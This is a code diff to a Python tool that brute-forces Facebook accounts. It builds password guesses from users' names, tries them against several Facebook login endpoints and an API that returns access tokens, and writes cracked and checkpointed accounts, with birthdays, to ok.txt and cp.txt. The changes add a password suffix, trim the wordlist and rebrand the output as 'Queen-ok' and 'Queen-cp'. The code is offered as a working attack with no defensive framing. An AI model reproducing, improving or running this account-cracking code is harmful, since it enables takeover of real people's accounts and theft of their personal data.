@@ -554,17 +554,12 @@ def generate(text):
 		else:
 			i=i.lower()
 			if len(i)==3 or len(i)==4 or len(i)==5:
+				results.append(i+"1122")
 				results.append(i+"123")
 				results.append(i+"12345")
-				results.append("234567")
-				results.append("223344")
-				results.append("556677")
-				results.append("786786786")
-				results.append("pakistan")
 			else:
 				results.append(i+"123")
 				results.append(i+"12345")
-				results.append("234567")
 				results.append("223344")
 				results.append("556677")
 				results.append("786786786")
@@ -767,13 +762,13 @@ class crack:
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="cp":
-					print(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;33m Queen-cp> %s • %s               "%(fl.get("id"),i)))
 					self.cp.append("%s • %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s • %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;32m Queen-ok> %s • %s               "%(fl.get("id"),i)))
 					self.ada.append("%s • %s"%(fl.get("id"),i))
 					open("ok.txt","a+").write(
 						"%s • %s\n"%(fl.get("id"),i))
@@ -861,13 +856,13 @@ class crackttl:
 						tt=json.loads(ke.text)
 						ttl=tt["birthday"]
 					except:pass
-					print(("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
+					print(("\r\x1b[0;33m Queen-cp> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
 					self.cp.append("%s • %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;32m Queen-ok> %s • %s               "%(fl.get("id"),i)))
 					self.ada.append("%s • %s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -953,13 +948,13 @@ class crekm:
 				log=mbasic(fl.get("id"),
 					i,"https://m.facebook.com")
 				if log.get("status")=="cp":
-					print(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;33m Queen-cp> %s • %s               "%(fl.get("id"),i)))
 					self.cp.append("%s • %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s • %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;32m Queen-ok> %s • %s               "%(fl.get("id"),i)))
 					self.ada.append("%s • %s"%(fl.get("id"),i))
 					open("ok.txt","a+").write(
 						"%s • %s\n"%(fl.get("id"),i))
@@ -1047,13 +1042,13 @@ class crekmttl:
 						tt=json.loads(ke.text)
 						ttl=tt["birthday"]
 					except:pass
-					print(("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
+					print(("\r\x1b[0;33m Queen-cp> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
 					self.cp.append("%s • %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;32m Queen-ok> %s • %s               "%(fl.get("id"),i)))
 					self.ada.append("%s • %s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -1139,13 +1134,13 @@ class tofbe:
 				log=mbasic(fl.get("id"),
 					i,"https://touch.facebook.com")
 				if log.get("status")=="cp":
-					print(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;33m Queen-cp> %s • %s               "%(fl.get("id"),i)))
 					self.cp.append("%s • %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s • %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;32m Queen-ok> %s • %s               "%(fl.get("id"),i)))
 					self.ada.append("%s • %s"%(fl.get("id"),i))
 					open("ok.txt","a+").write(
 						"%s • %s\n"%(fl.get("id"),i))
@@ -1233,13 +1228,13 @@ class tofbettl:
 						tt=json.loads(ke.text)
 						ttl=tt["birthday"]
 					except:pass
-					print(("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
+					print(("\r\x1b[0;33m Queen-cp> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
 					self.cp.append("%s • %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;32m Queen-ok> %s • %s               "%(fl.get("id"),i)))
 					self.ada.append("%s • %s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -1325,13 +1320,13 @@ class freefb:
 				log=mbasic(fl.get("id"),
 					i,freefacebook)
 				if log.get("status")=="cp":
-					print(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;33m Queen-cp> %s • %s               "%(fl.get("id"),i)))
 					self.cp.append("%s • %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s • %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;32m Queen-ok> %s • %s               "%(fl.get("id"),i)))
 					self.ada.append("%s • %s"%(fl.get("id"),i))
 					open("ok.txt","a+").write(
 						"%s • %s\n"%(fl.get("id"),i))
@@ -1419,13 +1414,13 @@ class freefbttl:
 						tt=json.loads(ke.text)
 						ttl=tt["birthday"]
 					except:pass
-					print(("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
+					print(("\r\x1b[0;33m Queen-cp> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
 					self.cp.append("%s • %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;32m Queen-ok> %s • %s               "%(fl.get("id"),i)))
 					self.ada.append("%s • %s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -1511,7 +1506,7 @@ class bapi:
     response = requests.get(api, params=params)
     if re.search("(EAAA)\\w+", response.text):
       self.ok.append(username + " • " + password)
-      print(("\r\x1b[0;32m * --> %s • %s %s               "%(username,password,N)))
+      print(("\r\x1b[0;32m Queen-ok> %s • %s %s               "%(username,password,N)))
       ok.append(username + " • " + password)
       save = open("ok.txt", "a")
       save.write(str(username) + " • " + str(password) + "\n")
@@ -1520,7 +1515,7 @@ class bapi:
     else:
       if "www.facebook.com" in response.json()["error_msg"]:
         self.cp.append(username + " • " + password)
-        print(("\r\x1b[0;33m * --> %s • %s %s               "%(username,password,N)))
+        print(("\r\x1b[0;33m Queen-cp> %s • %s %s               "%(username,password,N)))
         save = open("cp.txt", "a+")
         save.write(str(username) + " • " + str(password) + "\n")
         save.close()
@@ -1621,7 +1616,7 @@ class bapittl:
     response = requests.get(api, params=params)
     if re.search("(EAAA)\\w+", response.text):
       self.ok.append(username + " • " + password)
-      print(("\r\x1b[0;32m * --> %s • %s %s               "%(username,password,N)))
+      print(("\r\x1b[0;32m Queen-ok> %s • %s %s               "%(username,password,N)))
       ok.append(username + " • " + password)
       save = open("ok.txt", "a")
       save.write(str(username) + " • " + str(password) + "\n")
@@ -1635,7 +1630,7 @@ class bapittl:
           ttl=tt["birthday"]
         except:pass
         self.cp.append(username + " • " + password + " • " + ttl)
-        print(("\r\x1b[0;33m * --> %s • %s • %s   "%(username,password,ttl)))
+        print(("\r\x1b[0;33m Queen-cp> %s • %s • %s   "%(username,password,ttl)))
         save = open("cp.txt", "a+")
         save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
         save.close()
